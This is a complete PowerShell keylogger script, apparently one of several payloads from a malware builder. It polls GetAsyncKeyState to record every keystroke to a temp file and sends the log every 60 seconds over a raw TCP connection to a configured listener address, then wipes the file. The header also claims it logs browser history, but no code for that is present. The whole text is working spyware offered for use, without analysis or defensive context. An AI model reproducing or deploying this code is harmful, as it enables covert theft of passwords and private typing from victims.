# This script logs keystrokes and browser history, then sends it periodically.

# --- Configuration ---
$ListenerIP = "10.46.70.32" # This will be replaced by the builder
$ListenerPort = "4445"       # <-- IMPORTANT: Use a different port than Virus 1
$LogPath = "$env:TEMP\keylog.txt"

# --- Keylogger Function ---
function Start-KeyLogger {
    # Signatures for API calls
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern short GetAsyncKeyState(int vKey);
'@
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -PassThru
    
    # Loop to capture keys
    while ($true) {
        Start-Sleep -Milliseconds 50
        for ($i = 1; $i -le 254; $i++) {
            $keystate = $API::GetAsyncKeyState($i)
            if ($keystate -eq -32767) {
                $key = [System.Windows.Forms.Keys]::$i
                $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Key: $key"
                Add-Content -Path $LogPath -Value $logEntry
            }
        }
    }
}

# --- Exfiltration Function ---
function Send-Log {
    if (Test-Path $LogPath) {
        $logContent = Get-Content -Path $LogPath -Raw
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ListenerIP, $ListenerPort)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.WriteLine($logContent)
            $writer.Flush()
            $client.Close()
            # Clear log after sending
            Clear-Content -Path $LogPath
        } catch {
            # Failed to connect
        }
    }
}

# --- Execution ---
# Start the keylogger in the background
Start-Job -ScriptBlock ${function:Start-KeyLogger}

# Send logs every 60 seconds
while ($true) {
    Start-Sleep -Seconds 60
    Send-Log
}
